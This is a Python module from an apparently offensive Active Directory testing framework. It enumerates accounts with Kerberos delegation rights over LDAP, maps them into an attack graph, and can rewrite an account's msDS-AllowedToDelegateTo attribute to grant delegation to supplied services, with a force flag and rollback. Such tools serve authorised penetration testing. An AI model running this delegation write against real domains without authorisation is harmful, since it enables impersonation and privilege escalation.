"""Unconstrained / constrained / protocol-transition delegation."""

from __future__ import annotations

from typing import Any

from ldap3 import MODIFY_REPLACE, SUBTREE
from rich.console import Console

from adaf_attack.capabilities.capability_catalog import register_from_catalog
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_ops import (
    attr_strings,
    attr_value,
    finish,
    lookup_sam,
    register_attr_rollback,
    require_force,
)
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()

UAC_TRUSTED_FOR_DELEG = 0x00080000
UAC_TRUSTED_TO_AUTH = 0x01000000
ATTR_CONSTRAINED = "msDS-AllowedToDelegateTo"


def _uac(entry: Any) -> int:
    raw = attr_value(entry, "userAccountControl")
    try:
        return int(raw or 0)
    except (TypeError, ValueError):
        return 0


def _enum_delegation(
    conn: Any,
    base_dn: str,
    target: Target,
    graph: AttackGraph,
    *,
    unconstrained: bool,
    protocol_transition: bool,
) -> list[dict[str, Any]]:
    conn.search(
        base_dn,
        "(|(objectClass=user)(objectClass=computer))",
        search_scope=SUBTREE,
        attributes=[
            "sAMAccountName",
            "distinguishedName",
            "userAccountControl",
            ATTR_CONSTRAINED,
            "dNSHostName",
        ],
    )
    hits: list[dict[str, Any]] = []
    for entry in conn.entries:
        sam = str(attr_value(entry, "sAMAccountName") or "")
        if not sam:
            continue
        uac = _uac(entry)
        item = {
            "sam": sam,
            "dn": str(attr_value(entry, "distinguishedName") or ""),
            "dns": str(attr_value(entry, "dNSHostName") or "") or None,
            "unconstrained": bool(uac & UAC_TRUSTED_FOR_DELEG),
            "protocol_transition": bool(uac & UAC_TRUSTED_TO_AUTH),
            "allowed_to_delegate_to": attr_strings(entry, ATTR_CONSTRAINED),
        }
        match = (unconstrained and item["unconstrained"]) or (
            protocol_transition and item["protocol_transition"]
        )
        if not match and not unconstrained and not protocol_transition:
            match = bool(
                item["allowed_to_delegate_to"]
                or item["unconstrained"]
                or item["protocol_transition"]
            )
        if not match:
            continue
        hits.append(item)
        node = f"ACCOUNT@{sam.upper()}@{target.domain.upper()}"
        graph.add_node(node, "Computer" if sam.endswith("$") else "User", sam=sam, dn=item["dn"])
        if item["unconstrained"]:
            graph.add_edge(node, f"DOMAIN@{target.domain.upper()}", "UnconstrainedDelegation")
        if item["allowed_to_delegate_to"]:
            graph.add_edge(node, f"DOMAIN@{target.domain.upper()}", "AllowedToDelegate")
        if item["protocol_transition"]:
            graph.add_edge(node, f"DOMAIN@{target.domain.upper()}", "TrustedToAuth")
        console.print(
            f"  {sam} unconstrained={item['unconstrained']} "
            f"protocol_transition={item['protocol_transition']}"
        )
    return hits


@register_from_catalog("unconstrained-delegation")
class UnconstrainedDelegation:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        **kwargs: Any,
    ) -> dict[str, Any]:
        console.print(f"[bold]unconstrained-delegation[/bold] → {target.domain}")
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            hits = _enum_delegation(
                conn, base_dn, target, graph, unconstrained=True, protocol_transition=False
            )
            result = {"domain": target.domain, "count": len(hits), "principals": hits}
            return finish(session, graph, "unconstrained-delegation", result, count=len(hits))
        finally:
            conn.unbind()


@register_from_catalog("trustedtoauth")
class TrustedToAuth:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        **kwargs: Any,
    ) -> dict[str, Any]:
        console.print(f"[bold]trustedtoauth[/bold] → {target.domain}")
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            hits = _enum_delegation(
                conn, base_dn, target, graph, unconstrained=False, protocol_transition=True
            )
            result = {"domain": target.domain, "count": len(hits), "principals": hits}
            return finish(session, graph, "trustedtoauth", result, count=len(hits))
        finally:
            conn.unbind()


@register_from_catalog("constrained-delegation")
class ConstrainedDelegation:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        console.print(f"[bold]constrained-delegation[/bold] → {target.domain}")
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            hits = _enum_delegation(
                conn, base_dn, target, graph, unconstrained=False, protocol_transition=False
            )
            result: dict[str, Any] = {
                "domain": target.domain,
                "count": len(hits),
                "principals": hits,
                "set_attempt": None,
            }
            sam = kwargs.get("sam") or kwargs.get("write_target")
            spns = kwargs.get("spn") or kwargs.get("spns") or kwargs.get("value")
            if sam:
                require_force("constrained-delegation", force)
                if not spns:
                    raise RuntimeError("constrained-delegation set requires -P spn=<service/host>")
                spn_list = [s.strip() for s in str(spns).split(",") if s.strip()]
                found = lookup_sam(conn, base_dn, str(sam), ["distinguishedName", ATTR_CONSTRAINED])
                if not found:
                    raise RuntimeError(f"Principal not found: {sam}")
                dn, entry = found
                previous = attr_strings(entry, ATTR_CONSTRAINED)
                ok = bool(conn.modify(dn, {ATTR_CONSTRAINED: [(MODIFY_REPLACE, spn_list)]}))
                if ok:
                    register_attr_rollback(
                        session,
                        target_dn=dn,
                        attribute=ATTR_CONSTRAINED,
                        previous=previous,
                        rollback="Restore msDS-AllowedToDelegateTo.",
                    )
                result["set_attempt"] = {
                    "ok": ok,
                    "sam": sam,
                    "dn": dn,
                    "spns": spn_list,
                    "previous": previous,
                    "ldap_result": str(conn.result),
                }
            return finish(session, graph, "constrained-delegation", result, count=len(hits))
        finally:
            conn.unbind()
